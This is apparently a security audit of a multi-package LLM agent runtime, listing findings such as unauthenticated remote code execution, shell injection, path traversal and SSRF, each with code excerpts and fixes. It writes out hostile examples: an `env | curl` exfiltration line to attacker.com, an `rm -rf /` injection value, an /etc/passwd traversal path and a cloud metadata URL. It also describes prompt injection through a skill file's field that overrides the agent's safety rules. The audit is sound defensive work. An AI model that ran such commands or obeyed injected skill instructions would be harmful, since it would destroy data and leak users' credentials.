# Harness Security & Stability Assessment

**Date:** 2026-02-20
**Scope:** Full codebase review of the Harness LLM Agent Runtime (v0.1.0)
**Packages reviewed:** `@harness/core`, `@harness/server`, `@harness/desktop`, `@harness/cli`

---

## Executive Summary

Harness is a multi-package LLM agent runtime that executes shell commands, file operations, and HTTP requests on behalf of an AI model. This architecture inherently carries high risk because the LLM is the decision-maker for tool invocations. The review identified **5 Critical**, **4 High**, **5 Medium**, and **3 Low** severity findings. The most impactful issues involve unauthenticated remote code execution via the server package, shell injection through skill parameter substitution, and full environment variable leakage to shell subprocesses.

### Risk Summary

| Severity | Count | Key Areas |
|----------|-------|-----------|
| **Critical** | 5 | Unauthenticated API, CORS wildcard, shell injection via skills, environment leakage, no rate limiting on RCE endpoint |
| **High** | 4 | Path traversal in file tools, dynamic plugin loading, unescaped error messages in protocol, SSRF via HTTP tool |
| **Medium** | 5 | Electron sandbox disabled, shared agent state across WebSocket sessions, prompt injection via skills, YAML deserialization surface, no request body size limit |
| **Low** | 3 | Informational error leakage, missing CSP headers, no TLS enforcement |

---

## Critical Findings

### C1. Unauthenticated Remote Code Execution via `/api/run`

**File:** `packages/server/src/server.ts:49-69`

The HTTP server exposes a `POST /api/run` endpoint that directly invokes `agent.run(task)` with zero authentication or authorization. Any network-reachable client can submit arbitrary tasks that cause the agent to execute shell commands, read/write files, and make HTTP requests on the host machine.

```typescript
// server.ts:49-61
if (req.method === "POST" && req.url === "/api/run") {
  let body = "";
  req.on("data", (chunk: string) => (body += chunk));
  req.on("end", async () => {
    const { task } = JSON.parse(body);
    // No authentication check whatsoever
    const result = await agent.run(task);
    res.end(JSON.stringify(result));
  });
}
```

**Impact:** Full remote code execution. An attacker can instruct the agent to run arbitrary shell commands on the host.

**Recommendation:**
- Implement authentication (API key header, JWT, or mTLS).
- Bind to `127.0.0.1` by default instead of `0.0.0.0`.
- Add an allowlist of permitted operations or require human-in-the-loop confirmation for server mode.

---

### C2. Wildcard CORS Allows Cross-Origin Exploitation

**File:** `packages/server/src/server.ts:27`

```typescript
res.setHeader("Access-Control-Allow-Origin", "*");
```

Combined with C1, this allows any website to trigger agent execution via a cross-origin `fetch()` call. A malicious page visited by a user running the Harness server can silently issue `POST /api/run` and exfiltrate results.

**Impact:** Cross-site remote code execution. Visiting a malicious website while the server is running leads to full compromise.

**Recommendation:**
- Remove the wildcard CORS header.
- If cross-origin access is needed, restrict to a configurable list of allowed origins.
- Add CSRF protection tokens.

---

### C3. Shell Command Injection via Skill Parameter Substitution

**File:** `packages/core/src/skills/resolver.ts:82-85`

Skill-defined tools substitute parameters into shell commands using naive string replacement with no escaping:

```typescript
let cmd = skillTool.command;
for (const [key, value] of Object.entries(args)) {
  cmd = cmd.replace(`{${key}}`, String(value));
}
// cmd is then passed directly to exec()
```

If a skill defines a command like `grep {pattern} {file}`, an LLM-generated parameter value of `"; rm -rf / #` would be injected directly into the shell command.

**Impact:** Arbitrary command execution. The LLM (or a prompt-injection attack targeting the LLM) can craft parameters that break out of the intended command context.

**Recommendation:**
- Use a shell-escaping library (e.g., `shell-escape` or `shell-quote`) on all parameter values before substitution.
- Alternatively, switch from `exec()` to `execFile()` with an argument array, avoiding shell interpretation entirely.
- Validate parameter values against expected types and patterns defined in the skill schema.

---

### C4. Full Environment Leakage to Shell Subprocesses

**File:** `packages/core/src/tools/builtin/shell.ts:39`

```typescript
exec(command, {
  cwd: workdir,
  env: { ...process.env },  // ALL env vars passed through
  // ...
});
```

The entire `process.env` is forwarded to every shell command. This means the LLM can extract secrets by generating commands like `echo $ANTHROPIC_API_KEY` or `env | curl -X POST -d @- https://attacker.com`. The `requiresConfirmation` flag mitigates this in interactive mode, but:
1. The server package auto-approves all tool executions (no confirmation mechanism).
2. Plugin hooks can programmatically bypass confirmation.

**Impact:** API keys (ANTHROPIC_API_KEY, OPENAI_API_KEY) and any other environment secrets can be exfiltrated.

**Recommendation:**
- Create a sanitized environment for shell subprocesses, stripping sensitive variables (API keys, tokens, credentials).
- Maintain an explicit allowlist of environment variables that may be passed through.
- In server mode, always require human-in-the-loop confirmation for shell commands.

---

### C5. No Rate Limiting on RCE-Capable Endpoints

**Files:** `packages/server/src/server.ts`, `packages/server/src/ws.ts`

Neither the HTTP `/api/run` endpoint nor the WebSocket `/ws` endpoint implement any rate limiting, connection throttling, or request size limits. Combined with the lack of authentication (C1), this enables:

- Denial of Service via rapid task submissions, exhausting LLM API credits.
- Resource exhaustion through concurrent shell command execution.
- Financial abuse by burning API token budgets.

**Recommendation:**
- Implement per-IP and global rate limits on `/api/run` and WebSocket connections.
- Cap concurrent running tasks per session.
- Add configurable request body size limits (`req.on("data")` accumulates unbounded data at `server.ts:51`).

---

## High Findings

### H1. Path Traversal in File Operation Tools

**File:** `packages/core/src/tools/builtin/file-ops.ts:25, 56, 91`

The file tools use `path.resolve(ctx.workdir, args.path)` to resolve user-supplied paths. While `path.resolve()` normalizes `..` sequences, it does not constrain the result to be within `workdir`:

```typescript
// path.resolve("/app/workdir", "../../etc/passwd") → "/etc/passwd"
const filePath = path.resolve(ctx.workdir, args.path as string);
```

The `fileReadTool` has no `requiresConfirmation` flag, meaning the LLM can read arbitrary files without user approval. `fileWriteTool` requires confirmation but also creates parent directories recursively (`mkdirSync(dir, { recursive: true })`), allowing arbitrary directory creation.

**Impact:** Arbitrary file read across the filesystem. Arbitrary file write and directory creation with user confirmation bypass possible in server mode.

**Recommendation:**
- After resolving the path, validate that it starts with the workdir prefix: `if (!resolved.startsWith(path.resolve(ctx.workdir)))`.
- Add `requiresConfirmation: true` to `fileReadTool` as well.
- Consider a configurable filesystem sandbox with an allowlist of accessible directories.

---

### H2. Arbitrary Code Execution via Dynamic Plugin Loading

**File:** `packages/core/src/plugins/loader.ts:68`

Plugins are loaded via dynamic `import()` with resolution paths that include ancestor directories:

```typescript
const mod = await import(resolved);
```

The `PluginLoader` constructor walks up the entire directory tree looking for `plugins/` directories (lines 42-51). If an attacker can place files in any ancestor directory's `plugins/` folder, they achieve code execution. The plugin `activate()` hook receives full access to the agent state, event bus, and tool registry.

**Impact:** Arbitrary code execution if an attacker can write to any ancestor `plugins/` directory.

**Recommendation:**
- Restrict plugin search paths to explicit configured directories only; remove the ancestor-directory walk.
- Validate plugin integrity (checksums, signatures) before loading.
- Log all plugin load paths for audit.

---

### H3. Server-Side Request Forgery (SSRF) via HTTP Fetch Tool

**File:** `packages/core/src/tools/builtin/http.ts:34-62`

The `http_fetch` tool makes arbitrary HTTP requests with user-controlled URLs, methods, headers, and body:

```typescript
const response = await fetch(url, {
  method,
  headers,
  body: body || undefined,
  signal: AbortSignal.timeout(25_000),
});
```

There is no validation of the target URL. The LLM can request internal network resources (`http://169.254.169.254/latest/meta-data/` for cloud metadata, `http://localhost:8080/admin`, internal services).

**Impact:** Internal network scanning, cloud metadata exfiltration (AWS/GCP/Azure instance credentials), access to internal services.

**Recommendation:**
- Implement URL validation that blocks private/internal IP ranges (RFC 1918, link-local, loopback).
- Block access to cloud metadata endpoints.
- Consider a configurable URL allowlist/blocklist.

---

### H4. Unescaped Data in WebSocket Error Messages

**File:** `packages/server/src/ws.ts:127`

```typescript
message: `Unknown message type: ${(msg as any).type}`,
```

User-controlled input is directly interpolated into error messages. While this is JSON-encoded for transport and not directly rendered as HTML on the server, if any downstream consumer renders these messages as HTML without escaping, it creates an XSS vector. More importantly, verbose error messages like this aid attackers in understanding the system.

**Recommendation:**
- Avoid reflecting user input in error messages. Use generic messages and log the details server-side.

---

## Medium Findings

### M1. Electron Sandbox Disabled

**File:** `packages/desktop/src/main/index.ts:99`

```typescript
webPreferences: {
  contextIsolation: true,
  nodeIntegration: false,
  sandbox: false,  // ← Weakens isolation
},
```

While `contextIsolation` and `nodeIntegration: false` are correctly set, `sandbox: false` disables Chromium's multi-process sandbox. If the renderer process is compromised (e.g., via XSS in chat message rendering), the attacker has broader access than they would with a sandboxed renderer.

**Recommendation:**
- Enable `sandbox: true`.
- If preload scripts require Node.js APIs incompatible with sandboxing, refactor to use IPC for those operations.

---

### M2. Shared Agent State Across WebSocket Sessions

**File:** `packages/server/src/ws.ts:164-175`

When a WebSocket client sends runtime config overrides (`config.provider`, `config.model`, etc.), these are applied to the shared `agent.state`:

```typescript
if (config) {
  const stateConfig = agent.state.get("config");
  agent.state.update({ config: { ...stateConfig, ...config } });
}
```

Since all sessions share the same `agent` instance, one client's config changes affect all other connected clients. This is a race condition for concurrent sessions and allows one client to hijack another's provider/model settings.

**Impact:** Cross-session interference; one client can redirect another's LLM calls to a different provider or model.

**Recommendation:**
- Create per-session agent instances or per-session config overrides that don't mutate shared state.

---

### M3. Prompt Injection Surface via Skill `prompt_injection` Field

**File:** `packages/core/src/skills/resolver.ts:36-41`

Skills can define a `prompt_injection` field that is concatenated directly into the system prompt:

```typescript
export function buildSkillPromptInjection(skills: SkillDocument[]): string {
  const injections = skills
    .filter((s) => s.prompt_injection)
    .map((s) => s.prompt_injection!.trim());
  return injections.join("\n\n");
}
```

A malicious skill YAML file in `~/.harness/skills/` or `./skills/` can inject arbitrary instructions into the system prompt, potentially overriding safety boundaries defined in the soul document.

**Impact:** An attacker who can write skill YAML files can hijack the agent's behavior.

**Recommendation:**
- Validate and sanitize skill prompt injections.
- Separate skill instructions from the core system prompt with clear delimiters that the LLM is instructed to respect.
- Require explicit user approval for skills that define prompt injections.

---

### M4. YAML Deserialization Attack Surface

**Files:** `packages/core/src/index.ts:195`, `packages/core/src/soul/loader.ts:39`, `packages/core/src/skills/loader.ts:44`

Multiple components parse YAML from user-controlled directories. The `yaml` npm package (v2.x) is used, which is safe by default (no code execution during parsing, unlike Python's `yaml.load`). However, YAML files from these directories are trusted as configuration and skill/soul definitions, effectively becoming code (skill commands become shell commands, soul layers become system prompts).

**Impact:** Low risk from the parser itself; medium risk from the semantic content of parsed files being treated as executable configuration.

**Recommendation:**
- Validate parsed YAML against strict schemas before use.
- Log which files are loaded and from which paths.

---

### M5. Unbounded Request Body Accumulation

**File:** `packages/server/src/server.ts:50-51`

```typescript
let body = "";
req.on("data", (chunk: string) => (body += chunk));
```

There is no limit on the accumulated request body size. An attacker can send a multi-gigabyte POST body to exhaust server memory.

**Impact:** Denial of Service via memory exhaustion.

**Recommendation:**
- Enforce a maximum body size (e.g., 1MB) and destroy the connection if exceeded.
- Example: track `body.length` in the `data` handler and call `req.destroy()` if it exceeds the limit.

---

## Low Findings

### L1. Verbose Error Messages Leak Internal Details

**Files:** Multiple locations across `server.ts`, `ws.ts`, `ipc-handlers.ts`

Error messages from caught exceptions are returned directly to clients:

```typescript
// server.ts:65
res.end(JSON.stringify({ error: err.message }));
```

Stack traces and internal error details (file paths, module names, database errors) can be exposed to clients, aiding reconnaissance.

**Recommendation:**
- Return generic error messages to clients. Log full errors server-side.

---

### L2. No Content Security Policy in Electron

**File:** `packages/desktop/src/main/index.ts`

The Electron app does not set a Content Security Policy (CSP) via `session.defaultSession.webRequest` or `<meta>` tags. While the renderer loads local files, the absence of CSP means that if XSS occurs, there are no restrictions on script sources or inline execution.

**Recommendation:**
- Set a strict CSP: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'`.

---

### L3. No TLS Enforcement for Server Mode

**File:** `packages/server/src/server.ts`

The server uses plain HTTP (`http.createServer`). API keys and task data are transmitted in cleartext.

**Recommendation:**
- Support HTTPS via configurable TLS certificates.
- At minimum, document that a reverse proxy with TLS termination should be used in production.

---

## Stability Concerns

### S1. Unhandled Promise Rejection in Event Bus

**File:** `packages/core/src/events/bus.ts:81-98`

While hook errors are caught with try-catch, the `emit()` method's loop over hooks is sequential and async. If a hook throws a synchronous error that isn't caught by the try-catch (unlikely but possible with certain native errors), it could crash the loop and prevent subsequent hooks from running.

Additionally, global listeners at lines 101-107 are fire-and-forget with no async error handling. If a global listener is async and rejects, the rejection goes unhandled.

**Recommendation:**
- Wrap global listener calls in `Promise.resolve().then()` or add `.catch()` handlers.
- Add a process-level `unhandledRejection` handler.

---

### S2. Memory Leaks from Abandoned WebSocket Sessions

**File:** `packages/server/src/ws.ts:64-93`

Event listeners are registered per WebSocket connection (lines 184-218) and cleaned up in the `.finally()` block of `handleRun`. However, if the WebSocket disconnects *during* the agent run before `.finally()` executes, the `session.unsubscribes` array grows but cleanup may not complete atomically. The `ws.on("close")` handler calls `sessions.destroy()` which unsubscribes listeners, but there's a race between the finally block and the close handler.

**Recommendation:**
- Ensure idempotent cleanup: guard against double-unsubscribe in both the finally block and the close handler.

---

### S3. Single-Threaded Agent Bottleneck in Server Mode

**File:** `packages/server/src/server.ts:21`

A single `agent` instance is created and shared across all connections. The `runLoop` function is async but CPU-bound LLM response parsing and tool execution happen on the main thread. Under concurrent load, long-running shell commands (up to 55 seconds) block the event loop for that duration via the `exec()` callback pattern.

**Recommendation:**
- Consider worker threads or process isolation for concurrent task execution.
- At minimum, limit concurrent running tasks.

---

### S4. No Graceful Shutdown

**File:** `packages/server/src/server.ts:97-107`

The server does not handle `SIGTERM` or `SIGINT` signals for graceful shutdown. Running tasks are not cancelled, WebSocket connections are not drained, and the database is not properly closed.

**Recommendation:**
- Add signal handlers that: cancel running tasks, close WebSocket connections with a 1001 code, close the database, then exit.

---

## Positive Findings

The following security practices were implemented correctly:

1. **SQL Injection Prevention:** `packages/core/src/persistence/sqlite.ts` uses parameterized prepared statements throughout. No raw string concatenation in queries.

2. **XSS Prevention in Desktop:** `packages/desktop/src/renderer/app.ts:953-957` implements a proper `esc()` function using `textContent`/`innerHTML` DOM-based escaping, and applies it consistently to user-controlled data.

3. **Session ID Generation:** `packages/server/src/sessions.ts:9,34` uses `uuid.v4()` for session IDs, providing sufficient entropy (122 bits of randomness).

4. **Electron Context Isolation:** `packages/desktop/src/main/index.ts:97-98` correctly enables `contextIsolation: true` and disables `nodeIntegration: false`.

5. **Preload Script API Surface:** `packages/desktop/src/preload/index.ts` exposes a minimal, well-defined API via `contextBridge` rather than exposing raw `ipcRenderer`.

6. **Tool Confirmation Gates:** Destructive tools (`shell`, `file_write`) are marked `requiresConfirmation: true`.

7. **WAL Mode for SQLite:** `packages/core/src/persistence/sqlite.ts:17` enables WAL journal mode, improving concurrent read performance and crash resilience.

8. **Git-ignored Secrets:** `.gitignore` properly excludes `.env`, `.env.*`, and database files.

---

## Recommendations Priority Matrix

| Priority | Finding | Effort |
|----------|---------|--------|
| **Immediate** | C1: Add authentication to server endpoints | Medium |
| **Immediate** | C2: Remove wildcard CORS | Low |
| **Immediate** | C3: Shell-escape skill parameters | Low |
| **Immediate** | C4: Sanitize environment for subprocesses | Medium |
| **Short-term** | C5: Add rate limiting | Medium |
| **Short-term** | H1: Add path traversal guards to file tools | Low |
| **Short-term** | H3: Add SSRF protection to HTTP tool | Medium |
| **Short-term** | H2: Restrict plugin load paths | Low |
| **Short-term** | M5: Add request body size limits | Low |
| **Medium-term** | M1: Enable Electron sandbox | Medium |
| **Medium-term** | M2: Per-session agent state | High |
| **Medium-term** | S3: Concurrent task isolation | High |
| **Medium-term** | S4: Graceful shutdown handlers | Low |
| **Low priority** | L1-L3: Error handling, CSP, TLS | Low-Medium |

---

## Methodology

This assessment was conducted through static analysis of the complete source code across all packages. The review examined:

- All tool implementations (`shell`, `file_read`, `file_write`, `file_list`, `http_fetch`)
- Server HTTP and WebSocket endpoints
- LLM provider integrations (Anthropic, OpenAI)
- Plugin loading and execution system
- Skill YAML loading, parameter substitution, and prompt injection
- Electron main process, preload, and renderer security boundaries
- Persistence layer (SQLite)
- Event bus architecture
- Session management
- Dependency manifests and configuration files
